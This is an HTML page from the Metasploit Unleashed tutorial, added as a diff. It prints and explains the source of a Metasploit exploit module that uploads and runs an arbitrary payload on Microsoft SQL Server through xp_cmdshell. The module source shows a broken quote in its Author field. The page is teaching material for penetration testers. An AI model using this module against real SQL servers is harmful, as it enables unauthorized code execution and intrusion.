@@ -1,0 +1,98 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Creating Our Auxiliary Module</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Creating
+Our Auxiliary Module</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">We will be looking at three different
+files, they should be relatively familar from prior sections.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">framework3/lib/msf/core/exploit/mssql_commands.rb<br>framework3/lib/msf/core/exploit/mssql.rb<br>framework3/modules/exploits/windows/mssql/mssql_payload.rb</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">One thing to caveat is that I didn't
+need to put different commands in
+three different files however, if you think ahead you may want to reuse
+code and putting the hex2binary portions in mssql.rb made the most
+sense, plus HDM is a stickler for pretty code (love you buddy).
+</span>
+<p style="color: rgb(0, 0, 0);">Let's first take a look at the
+mssql_payload.rb to get an idea of what we're looking at here.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">##<br># $Id: mssql_payload.rb 7236 2009-10-23 19:15:32Z hdm $<br>##<br><br>##<br># This file is part of the Metasploit Framework and may be subject to<br># redistribution and commercial restrictions. Please see the Metasploit<br># Framework web site for more information on licensing and terms of use.<br># http://metasploit.com/framework/<br>##<br><br>require 'msf/core'<br><br>class Metasploit3 &lt; Msf::Exploit::Remote<br><br>include Msf::Exploit::Remote::MSSQL<br>def initialize(info = {})<br><br>super(update_info(info,<br>'Name' =&gt; 'Microsoft SQL Server Payload Execution',<br>'Description' =&gt; %q{<br>This module will execute an arbitrary payload on a Microsoft SQL<br>Server, using the Windows debug.com method for writing an executable to disk<br>and the xp_cmdshell stored procedure. File size restrictions are avoided by<br>incorporating the debug bypass method presented at Defcon 17 by SecureState.<br>Note that this module will leave a metasploit payload in the Windows<br>System32 directory which must be manually deleted once the attack is completed.<br>},<br>'Author' =&gt; [ 'David Kennedy "ReL1K"<br>'License' =&gt; MSF_LICENSE,<br>'Version' =&gt; '$Revision: 7236 $',<br>'References' =&gt;<br>[<br>[ 'OSVDB', '557'],<br>[ 'CVE', '2000-0402'],<br>[ 'BID', '1281'],<br>[ 'URL', 'http://www.thepentest.com/presentations/FastTrack_ShmooCon2009.pdf'],<br>],<br>'Platform' =&gt; 'win',<br>'Targets' =&gt;<br>[<br>[ 'Automatic', { } ],<br>],<br>'DefaultTarget' =&gt; 0<br>))<br>end<br><br>def exploit<br><br>debug = false # enable to see the output<br><br>if(not mssql_login_datastore)<br>print_status("Invalid SQL Server credentials")<br>return<br>end<br><br>mssql_upload_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded), debug)<br><br>handler<br>disconnect<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">While this may seem extremely simple
+and not a ton of code, there
+is actually a lot of things that are going on behind the scenes that
+we'll investigate later. Let's break down this file for now. If you
+look at the top half, everything should look relatively the same right?
+If you look at the references section, this area is simply for
+additional information about the attack or original exploit vector. The
+platform of "win" is specifying Windows platforms and the Targets is
+simply a section if we wanted to add operating systems or in this
+example if we had to do something different based off of SQL server we
+could add SQL 2000, SQL 2005, and SQL 2008. The DefaultTarget allows us
+to specify a default for this attack, so if we used SQL 2000, SQL 2005,
+and SQL 2008, we could have it default to 2005, people could change it
+through SET TARGET 1 2 3 but if they didn't 2005 would be the system
+attacked.
+</span>
+<p style="color: rgb(0, 0, 0);">Moving to the "def exploit" this begins
+our actual code for the
+exploit, one thing to note from the above if you look at the very top
+we included "Msf::Exploit::Remote::MSSQL" this will include a variety
+of items we can call from the Exploit, Remote, and MSSQL portions.
+Specifically we are calling from the mssql.rb in the
+lib/msf/core/exploits area.
+</p>
+<p style="color: rgb(0, 0, 0);">The first line debug = false specifies
+if we should portray
+information back to you or not, typically we don't want this and isn't
+needed and would be quite a bit of information portrayed back to the
+Metasploit user. If something isn't working, simply change this to
+debug=true and you'll see everything that Metasploit is doing. Moving
+on to the next line, this is the most complex portion of the entire
+attack. This one liner here is really multiple lines of code being
+pulled from mssql.rb. We'll get into this one in a second, but to
+explain what is actually there:
+</p>
+<p style="color: rgb(0, 0, 0);">mssql_upload_exec (function defined in
+mssql.rb for uploading an executable through SQL to the underlying
+operating system)
+</p>
+<p style="color: rgb(0, 0, 0);">Msf::Util::EXE.to_win32pe(framework,payload.encoded)
+= create a
+metasploit payload based off of what you specified, make it an
+executable and encode it with default encoding
+</p>
+<p style="color: rgb(0, 0, 0);">debug = call the debug function is it
+on or off?
+</p>
+<p style="color: rgb(0, 0, 0);">Lastly the handler will handle the
+connections from the payload in the background so we can accept a
+metasploit payload.
+</p>
+<p style="color: rgb(0, 0, 0);">The disconnect portion of the code
+ceases the connection from the MSSQL server.
+</p>
+<p style="color: rgb(0, 0, 0);">Now that we have walked through this
+portion, we will break down
+the next section in the mssql.rb to find out exactly what this attack
+was doing.
+<br>
+<br>
+</p>
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Building_A_Metasploit_Module"
+ title="Building A Metasploit Module">Building a Metasploit Module</a></div>
+</body>
+</html>
